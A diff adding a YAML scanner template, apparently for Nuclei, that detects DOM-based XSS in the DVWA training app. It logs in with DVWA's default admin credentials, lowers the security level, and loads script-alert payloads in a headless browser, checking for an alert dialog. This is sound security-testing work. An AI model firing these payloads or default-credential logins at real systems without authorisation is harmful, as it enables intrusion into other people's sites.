@@ -1,0 +1,93 @@
+id: dvwa-headless-xss-dom-local-or-remote-low-sec
+
+info:
+  name: XSS Detection DOM based (Headless) Local or Remote - low sec (Authenticated)
+  author: Shieldia
+  severity: high
+  description: Detects XSS DOM based by injecting the URI locally or remote depending on URL.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: xss,headless,dom
+
+variables:
+  username: admin
+  password: password
+  payloads: 
+    - "<script>alert(1)</script>"
+    - "</script><script>alert(1);</script>"
+
+flow: |
+  http(1);
+  if (template["http_1_host"].includes("localhost")) {
+    for (let payload of iterate(template["payloads"])) {
+      set("payload", payload);
+      headless(1);
+    }
+  } else {
+    http(1) && http(2);
+    for (let payload of iterate(template["payloads"])) {
+      set("payload", payload);
+      headless(1);
+      }
+  }
+
+http:
+  # Step 1: Authenticate as admin and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+    
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to Low
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=low&seclev_submit=Submit&user_token={{token}}
+
+# Step 2: Run the local XSS attempts in headless mode
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}/vulnerabilities/xss_d/?default=English#default={{payload}}"
+          timeout: 1
+      - action: waitdialog
+        name: dom_default_query
+    matchers:
+      - type: dsl
+        name: "XSS Match maths in alert window"
+        dsl:
+          - dom_default_query == true
+          - dom_default_query_message == "1"
+        condition: and
+    
+    extractors:
+      - type: dsl
+        name: payload
+        dsl: 
+          - "payload"
